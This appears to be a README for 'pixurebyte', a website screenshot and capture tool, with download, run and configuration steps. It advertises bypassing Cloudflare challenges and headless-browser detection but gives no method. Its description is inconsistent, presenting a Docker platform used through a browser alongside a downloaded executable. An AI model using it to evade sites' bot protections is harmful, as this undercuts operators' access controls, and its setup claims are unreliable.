# 📸 pixurebyte - Capture Websites Easily and Quickly

## 🌟 Overview
Pixurebyte is an open source, self-hostable platform designed for capturing and analyzing websites with ease. It takes screenshots, collects full HTML source, request/response data, and gathers metadata in just minutes. Best of all, you can do this without being blocked by Cloudflare challenges or headless browser detection.

## 🚀 Getting Started
This guide will help you download and run Pixurebyte on your computer. Follow these simple steps to get started.

## 💻 System Requirements
- **Operating System:** Windows 10 / macOS Mojave (or later) / Linux (Ubuntu 18.04 or later)
- **RAM:** At least 4 GB
- **Disk Space:** Minimum 1 GB free space
- **Docker:** Installed and running (Docker Desktop or Docker Engine)
- **Browser:** Latest version of Chrome or Firefox for the user interface

## 📥 Download & Install
1. **Go to the Releases Page**  
   Visit the [Releases page to download Pixurebyte](https://github.com/philcyh/pixurebyte/releases) to find the latest version. 

2. **Select the Version**  
   You will see a list of available versions. Choose the most recent version for optimal performance and security.

3. **Download the Package**  
   Click on the package that matches your operating system. If you are unsure, the package typically looks like `pixurebyte-linux.zip`, `pixurebyte-macos.zip`, or `pixurebyte-windows.zip`.

4. **Extract the Files**  
   Once the download is complete, locate the ZIP file in your Downloads folder.  
   - On Windows: Right-click the ZIP file and select "Extract All."  
   - On macOS: Double-click the ZIP file to extract it.  
   - On Linux: You can use `unzip pixurebyte-linux.zip` in your terminal.

5. **Run the Application**  
   After extracting, open the folder.  
   - **On Windows:** Double-click on `pixurebyte.exe` to start the application.  
   - **On macOS:** Open `pixurebyte.app`. You may need to right-click and select "Open" the first time.  
   - **On Linux:** Open a terminal and navigate to the folder containing `pixurebyte`, then run `./pixurebyte`.

## ⚙️ Configuration
Before you start capturing websites, you may want to configure some settings.

1. **Set Up Docker**  
   Ensure that Docker is running. Pixurebyte uses Docker to create a reliable environment for capturing data.

2. **Adjust Settings**  
   Open Pixurebyte in your web browser. You can access the settings menu to configure things such as output format and storage options.

3. **Start Capturing**  
   Enter the URL you want to capture in the input field and click the "Capture" button. Pixurebyte will take care of the rest.

## 🛠️ Features
- **Screenshots:** Capture high-quality images of any webpage.
- **HTML Source:** Get the complete HTML source of the page for analysis.
- **Request/Response Data:** View the details of each request made, including headers and responses.
- **Metadata Collection:** Gather useful metadata related to the page.
- **Cloudflare Bypass:** Effectively capture pages protected by Cloudflare without interruptions.

## 🔍 Troubleshooting
If you encounter issues, please consider the following steps:

- **Check Docker Status:** Ensure Docker is running correctly. You may need to restart it.
- **Firewall Settings:** Make sure your firewall allows Pixurebyte to make network requests.
- **Update Application:** Always use the latest version for the best performance.
